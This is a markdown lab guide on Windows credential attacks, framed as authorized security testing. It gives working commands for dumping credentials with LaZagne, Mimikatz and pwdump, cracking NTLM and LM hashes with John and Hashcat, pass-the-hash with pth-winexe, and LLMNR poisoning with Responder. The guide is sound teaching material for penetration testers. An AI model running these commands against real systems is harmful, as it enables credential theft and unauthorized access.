 Authorized Security Testing

> **Disclaimer**
>
> This documentation is intended for **educational purposes** and should only be used in **authorized environments**, such as personal labs, CTFs, or systems where you have explicit permission to perform security testing.

---

## Topics Covered

* Windows User Management
* Windows Authentication
* Password Hash Extraction
* Credential Dumping Tools
* NTLM Hash Cracking
* Pass-the-Hash Authentication
* LLMNR/NBT-NS Poisoning using Responder

---

## Windows Authentication

Windows primarily uses **Kerberos** for authentication in Active Directory environments.

## Password Storage

Windows stores local account password hashes in the **Security Account Manager (SAM)** database.

* SAM = Security Account Manager
* Stores password hashes (not plaintext passwords)
* Used for local account authentication


## Change Password Using Command Prompt

Reset a local user's password:

```cmd
net user username 12345
```

Example:

```cmd
net user student Password@123
```

---

# LaZagne

LaZagne is an open-source credential recovery tool that can recover passwords stored on a Windows system.

Common modules include:

* Browser passwords
* Wi-Fi passwords
* Mail clients
* Databases
* FTP clients

Run Command Prompt as Administrator.

### Dump All Credentials

```cmd
lazagne.exe all
```

### Browser Passwords

```cmd
lazagne.exe browsers
```

### Wi-Fi Passwords

```cmd
lazagne.exe wifi
```

---

# Mimikatz

Mimikatz is a post-exploitation tool used for credential extraction and security research.

### Enable Debug Privilege

```text
privilege::debug
```

### Dump Logon Credentials

```text
sekurlsa::logonpasswords
```

This may display:

* Username
* Domain
* NTLM Hash
* Kerberos Tickets
* Cached Credentials

---

# WCE (Windows Credentials Editor)

WCE is a credential extraction utility capable of interacting with Windows authentication mechanisms during authorized security assessments.

Display Help
wce.exe -?

or

wce.exe /?

---

# pwdump

Pwdump extracts password hashes from the Windows SAM database.

Example:

```cmd
pwdump7.exe > hashes.txt
```

The output file contains password hashes that can later be analyzed in a lab environment.

---

# John the Ripper

John the Ripper is used to crack password hashes using dictionaries or brute-force attacks.

### Crack NT Hashes

```bash
john --wordlist=rockyou.txt --format=NT hashes.txt
```

### Display Cracked Passwords

```bash
john --show --format=NT hashes.txt
```

Supported hash formats include:

* NT
* LM
* MD5
* SHA1
* SHA256
* bcrypt

---

# Hashcat

Hashcat is a GPU-accelerated password recovery tool capable of cracking numerous hash formats.

Typical workflow:

1. Obtain password hashes.
2. Identify the hash type.
3. Select the appropriate Hashcat mode.
4. Run dictionary or mask attacks.
5. Review recovered passwords.


Crack an NTLM Hash Using a Wordlist

```cmd

hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Crack an LM Hash
```cmd
hashcat -m 3000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

# Pass-the-Hash (PtH)

Pass-the-Hash allows authentication using an NTLM hash instead of the plaintext password during authorized security testing.

Example syntax:

```bash
pth-winexe -U 'Administrator%LMHASH:NTHASH' //TARGET_IP cmd.exe
```

Example:

```bash
pth-winexe -U 'Admin%6B664D89FBDCEF4D3B23F8B9F75C1729:B3A13D95571B71E8903973E0D98406DF' //10.0.2.15 cmd.exe
```

> Perform Pass-the-Hash only on systems where you have explicit authorization.

---

# Responder

Responder is a network assessment tool that listens for and responds to broadcast name-resolution requests (such as LLMNR and NBT-NS) during authorized internal security assessments.

Example:

```bash
sudo responder -I eth0
```

Common use cases include:

* Internal network assessments
* Demonstrating insecure name resolution
* Capturing authentication attempts in controlled environments

---

# Common Hash Types and Hashcat Modes

| Hash Type                   | Hash Length | Hashcat Mode (`-m`) | Example                                    |
| --------------------------- | ----------: | ------------------: | ------------------------------------------ |
| MD5                         |          32 |                 `0` | `5f4dcc3b5aa765d61d8327deb882cf99`         |
| MD4                         |          32 |               `900` | `a448017aaf21d8525fc10ae87aa6729d`         |
| NTLM                        |          32 |              `1000` | `8846f7eaee8fb117ad06bdd830b7586c`         |
| LM                          |          32 |              `3000` | `E52CAC67419A9A224A3B108F3FA6CB6D`         |
| SHA-1                       |          40 |               `100` | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| SHA-224                     |          56 |              `1300` | `d63dc919e201d7bc64...`                    |
| SHA-256                     |          64 |              `1400` | `5e884898da28047151d0e56f8dc62927...`      |
| SHA-384                     |          96 |             `10800` | `59e1748777448c69de6b800d7a33bbfb...`      |
| SHA-512                     |         128 |              `1700` | `b109f3bbbc244eb82441917ed06d618b...`      |
| bcrypt                      |          60 |              `3200` | `$2b$12$...`                               |
| NetNTLMv1                   |      Varies |              `5500` | Challenge/Response                         |
| NetNTLMv2                   |      Varies |              `5600` | Challenge/Response                         |
| Kerberos 5 AS-REP           |      Varies |             `18200` | Kerberos AS-REP Hash                       |
| Kerberos 5 TGS-REP (RC4)    |      Varies |             `13100` | Kerberos Service Ticket                    |
| Kerberos 5 TGS-REP (AES128) |      Varies |             `19600` | AES128 Ticket                              |
| Kerberos 5 TGS-REP (AES256) |      Varies |             `19700` | AES256 Ticket                              |
| WPA/WPA2-PBKDF2             |      Varies |             `22000` | Wi-Fi Handshake                            |
| ZIP (PKZIP)                 |      Varies |             `17200` | Password-Protected ZIP                     |
| 7-Zip                       |      Varies |             `11600` | Password-Protected 7z                      |
| RAR3                        |      Varies |             `12500` | RAR3 Archive                               |
| RAR5                        |      Varies |             `13000` | RAR5 Archive                               |
| PDF 1.4–1.6                 |      Varies |             `10400` | Encrypted PDF                              |
| PDF 1.7                     |      Varies |             `10700` | Encrypted PDF                              |
| Office 2010                 |      Varies |              `9500` | Microsoft Office Document                  |
| Office 2013                 |      Varies |              `9600` | Microsoft Office Document                  |
| Office 2016                 |      Varies |              `9600` | Microsoft Office Document                  |
| VeraCrypt                   |      Varies |       `13711–13773` | Encrypted Volume                           |
| KeePass                     |      Varies |             `13400` | KeePass Database                           |

## Common Attack Modes

| Attack Mode | Description               |
| ----------- | ------------------------- |
| `-a 0`      | Dictionary Attack         |
| `-a 1`      | Combination Attack        |
| `-a 3`      | Brute-Force (Mask) Attack |
| `-a 6`      | Hybrid Wordlist + Mask    |
| `-a 7`      | Hybrid Mask + Wordlist    |

## Example

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

* `-m 1000` → NTLM
* `-a 0` → Dictionary Attack
* `hashes.txt` → File containing hashes
* `rockyou.txt` → Wordlist


# Tools Covered

| Tool            | Purpose                                               |
| --------------- | ----------------------------------------------------- |
| LaZagne         | Recover stored credentials                            |
| Mimikatz        | Extract credentials and Kerberos information          |
| WCE             | Windows credential utility                            |
| pwdump          | Dump password hashes from SAM                         |
| John the Ripper | Password hash cracking                                |
| Hashcat         | GPU-based password recovery                           |
| Responder       | Network credential capture in authorized environments |

---

# Learning Objectives

By completing this lab, you should understand:

* Windows authentication basics
* Kerberos authentication
* Security Account Manager (SAM)
* Local user administration
* Password hash extraction concepts
* NTLM vs LM hashes
* Password recovery techniques
* Pass-the-Hash concept
* Internal network credential attacks
* Defensive awareness for Windows environments

---

## References

* Microsoft Windows Security Documentation
* MIT Kerberos Documentation
* John the Ripper Documentation
* Hashcat Documentation
* LaZagne GitHub Repository
* Mimikatz Project
* Responder Project

---

**Author:** Shlok Kaneriya

**Topic:** Windows Hacking Fundamentals (Authorized Security Testing)
